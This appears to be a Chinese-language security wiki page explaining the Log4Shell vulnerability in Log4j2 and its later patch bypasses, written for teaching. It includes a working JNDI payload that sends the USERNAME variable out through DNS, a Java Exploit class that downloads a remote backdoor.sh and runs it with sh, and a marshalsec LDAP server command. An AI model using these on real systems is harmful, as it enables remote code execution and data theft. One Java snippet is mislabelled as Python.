---
slug: /log4shell
title: Log4shell（Log4j2 RCE）
icon: flame-icon
---

**Log4Shell 的根本危害在于日志框架将用户可控内容作为 JNDI 查找表达式执行，攻击者只需让目标应用打印一条包含 `${jndi:ldap://...}` 的日志，即可触发远程代码执行。** Log4j2是一个广泛使用的Java日志框架，允许开发者通过简单的方式记录日志。该漏洞被标识为CVE-2021-44228，通常称为”Log4Shell”，影响范围极广且能造成严重后果，是有史以来最危险的漏洞之一。

**Log4j2 分为接口层和实现层两个模块，漏洞位于 `log4j-core` 核心实现中。** `log4j-api` 是公共接口模块，主要用来定义日志的格式；`log4j-core` 是核心实现模块，提供具体的日志记录功能，`log4j-core` 依赖 `log4j-api`。Log4j 1.x 在2015年停止了维护，提到的 Log4j 默认指 2.x 版本。

**漏洞产生的核心原因在于记录日志中提供了 JNDI 功能。** 如果日志内容中存在 `JNDI LDAP`，Log4j 会连接该服务器并下载恶意对象，通过反射机制来实例化该对象并调用其方法。

```xml
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.0</version>
    </dependency>
</dependencies>
```

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class Main {
    private static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
         logger.error("${jndi:ldap://${env:USERNAME}.dns.feei.cn:8080/#Exploit}rce-test");
    }
}
```

**攻击入口覆盖面极广，凡是会被打印进日志的外部数据均可作为触发点。** 除了正常用户请求参数可能被打印在日志中外，各种请求头（Request Header）也是最常被利用的触发点，同时各种外部请求经过数据库、消息队列等再次转存后被触发也非常常见。

**利用协议不限于 LDAP，RMI 和 DNS 同样可以触发漏洞。** 使用 DNS 协议还常被用于漏洞探测阶段，通过外带域名回显来确认目标是否存在漏洞。

**日志优先级决定了载荷能否被执行。** 当前日志优先级大于等于系统设置级别时才有效（默认为 `.error`），默认这里只能用 `.error` 或 `.fatal`，不能使用 `.warn`/`.info`/`.debug`/`.trace`。

```xml
<?xml version="1.0" encoding="UTF-8"?>
 <Configuration status="WARN">
   <Appenders>
     <Console name="Console" target="SYSTEM_OUT">
       <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
     </Console>
   </Appenders>
   <Loggers>
     <Root level="error">
       <AppenderRef ref="Console"/>
     </Root>
   </Loggers>
 </Configuration>
```

```python
import org.apache.logging.log4j.core.config.Configurator;
Configurator.setLevel("Class Name", Level.INFO);
```

**恶意 LDAP 服务可通过多种工具搭建，攻击链最终依赖目标 JVM 反射执行下载到的恶意类。** 使用 `marshalsec` 工具创建一个恶意的 LDAP 服务。也可以通过 JNDI Exploiters、Apache Directory Server、OpenLDAP、Evil-WinRM，甚至通过 Python 使用 ldap3 库搭建恶意 LDAP 服务。

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;

public class Exploit{
    public Exploit() throws IOException,InterruptedException{
        String cmd = "\"$(curl -fsSL https://feei.cn/backdoor.sh)\"";
        final Process process = Runtime.getRuntime().exec(new String[] { "sh", "-c", cmd });
        printMessage(process.getInputStream());
        printMessage(process.getErrorStream());
        int value = process.waitFor();
        System.out.println(value);
    }

    private static void printMessage(final InputStream input) {
        new Thread (new Runnable() {
            @Override
            public void run() {
                Reader reader =new InputStreamReader(input);
                BufferedReader bf = new BufferedReader(reader);
                String line = null;
                try {
                    while ((line=bf.readLine())!=null)
                    {
                        System.out.println(line);
                    }
                }catch (IOException  e){
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
```

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/#Exploit
```

**Apache 对 Log4Shell 的修复经历了多次迭代，每一版补丁都在发布后被新的绕过方式击穿，最终历经四个版本才完成彻底修复。**

#### CVE-2021-45046

**第一版补丁（2.15.0）仅修复了默认配置下的问题，非默认配置仍可被利用。** 攻击者可以向使用某些非默认设置的系统发送恶意 JNDI 查找。Apache 使用 Log4J 版本 2.16.0 解决了此漏洞。

#### CVE-2021-45105

**2.16.0 引入了恶意消息可触发无限递归的新问题，导致拒绝服务。** Apache 发布了 2.17 版本来修复此漏洞。

#### CVE-2021-44832

**第三个绕过需要攻击者提前获取提升权限并修改日志配置，严重程度相对较低，但仍可实现远程代码执行。** Apache 发布了第四个补丁 Log4J 2.17.1 版来解决这个问题。
